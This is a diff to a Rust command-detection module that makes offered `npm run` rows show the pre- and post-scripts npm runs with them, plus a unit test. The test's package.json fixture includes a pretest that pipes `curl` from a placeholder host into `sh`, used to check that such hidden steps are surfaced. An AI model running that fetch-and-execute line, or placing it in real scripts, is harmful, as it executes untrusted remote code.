@@ -30,6 +30,18 @@
 //! holds a character that acts unseen ([`cineris_base::acts_unseen`]: a
 //! control character, a tab and a line break among them, a direction
 //! override, a character of no width), is not offered.
+//!
+//! **What npm runs with a script is shown with it** (since the step 25
+//! fixes): `npm run <name>` runs the script `pre<name>` before it and
+//! `post<name>` after it, when the file has them, each only if the one
+//! before it succeeded. A script with either is offered with all of them,
+//! in the order npm runs them, each in double quotes (its `"` and `\`
+//! escaped) and named: `pretest "lint", then "jest", then posttest
+//! "report"`. Each is held to the same rules as the script, and one that
+//! cannot be read whole, or is not text, keeps the script from being
+//! offered. The other files' commands show no script: what `make`, `cargo`,
+//! `go` and the Python tools run besides is their own (a target's
+//! prerequisites, a build script), as it is for a command typed by hand.
 
 use cineris_protocol::project::DetectedCommand;
 use serde_json::Value;
@@ -86,13 +98,10 @@ struct Found {
 }
 
 impl Found {
-    /// Offers `command` when it is plain words the observer classes, what
-    /// it runs (a script's text) can be read whole, and it is not offered
-    /// already.
+    /// Offers `command` when it is plain words the observer classes and it
+    /// is not offered already. What it runs (a script's text, [`npm_runs`])
+    /// has been found readable whole by the caller.
     fn offer(&mut self, name: &str, command: &str, runs: Option<&str>, source: &str) {
-        if runs.is_some_and(|runs| !readable(runs)) {
-            return;
-        }
         let Some(line) = normal_line(command).filter(|line| line == command) else {
             return;
         };
@@ -161,15 +170,61 @@ fn npm(text: &str, found: &mut Found) {
             break;
         }
         // A name is one word: `check me` would run `check` with `me`.
-        let Value::String(runs) = runs else {
-            continue;
-        };
         if name.is_empty() || name.contains(char::is_whitespace) {
             continue;
         }
+        let Some(runs) = npm_runs(scripts, name, runs) else {
+            continue;
+        };
         // `npm test` is `npm run test`: one line for each.
-        found.offer(name, &format!("npm run {name}"), Some(runs), "package.json");
+        found.offer(name, &format!("npm run {name}"), Some(&runs), "package.json");
     }
+}
+
+/// What `npm run <name>` runs, for its row: the script's text as it is,
+/// or, when the file has `pre<name>` or `post<name>`, every one npm runs
+/// in turn, each named and in double quotes. `None` when any of them is
+/// not text or cannot be read whole ([`readable`]): the row would not say
+/// all that the command runs.
+fn npm_runs(
+    scripts: &serde_json::Map<String, Value>,
+    name: &str,
+    runs: &Value,
+) -> Option<String> {
+    let text = |value: &Value| match value {
+        Value::String(text) if readable(text) => Some(text.clone()),
+        _ => None,
+    };
+    let main = text(runs)?;
+    let before = scripts.get(&format!("pre{name}")).map(text);
+    let after = scripts.get(&format!("post{name}")).map(text);
+    if before.is_none() && after.is_none() {
+        return Some(main);
+    }
+    let mut shown = Vec::new();
+    if let Some(before) = before {
+        shown.push(format!("pre{name} {}", quoted(&before?)));
+    }
+    shown.push(quoted(&main));
+    if let Some(after) = after {
+        shown.push(format!("post{name} {}", quoted(&after?)));
+    }
+    Some(shown.join(", then "))
+}
+
+/// `text` in double quotes, its `"` and `\` escaped: its bounds show
+/// beside the others'.
+fn quoted(text: &str) -> String {
+    let mut quoted = String::with_capacity(text.len() + 2);
+    quoted.push('"');
+    for c in text.chars() {
+        if matches!(c, '"' | '\\') {
+            quoted.push('\\');
+        }
+        quoted.push(c);
+    }
+    quoted.push('"');
+    quoted
 }
 
 fn make(text: &str, found: &mut Found) {
@@ -273,6 +328,45 @@ mod tests {
         assert_eq!(test.runs.as_deref(), Some("jest --coverage"));
         assert_eq!(test.name, "test");
         assert_eq!(test.purpose, CommandPurpose::Test);
+    }
+
+    /// `npm run <name>` runs `pre<name>` before the script and `post<name>`
+    /// after it: a script with either is offered with all it runs, in
+    /// order, each named and quoted, and one of them that cannot be read
+    /// whole, or is not text, keeps the script from being offered (the
+    /// review of step 25, finding 5).
+    #[test]
+    fn a_script_is_offered_with_what_npm_runs_before_and_after_it() {
+        let commands = found(&[(
+            "package.json",
+            r#"{"scripts": {
+                "pretest": "curl -s https://example.test/x.sh | sh",
+                "test": "jest",
+                "posttest": "node ./scripts/upload \"home\"",
+                "prebuild": "rm -rf dist",
+                "build": "tsc",
+                "lint": "eslint .",
+                "postlint": {"not": "text"},
+                "check": "tsc --noEmit",
+                "precheck": "a\tb"
+            }}"#,
+        )]);
+        assert_eq!(lines(&commands), ["npm run build", "npm run test"]);
+        assert_eq!(
+            commands[0].runs.as_deref(),
+            Some("prebuild \"rm -rf dist\", then \"tsc\"")
+        );
+        assert_eq!(
+            commands[1].runs.as_deref(),
+            Some(
+                "pretest \"curl -s https://example.test/x.sh | sh\", then \"jest\", then \
+                 posttest \"node ./scripts/upload \\\"home\\\"\""
+            )
+        );
+        // A `pre` past the cap keeps its script from being offered.
+        let long = "x".repeat(MAX_RUNS + 1);
+        let text = format!("{{\"scripts\": {{\"test\": \"jest\", \"pretest\": \"{long}\"}}}}");
+        assert!(found(&[("package.json", &text)]).is_empty());
     }
 
     /// What a script runs is given whole, or the script is not offered: a
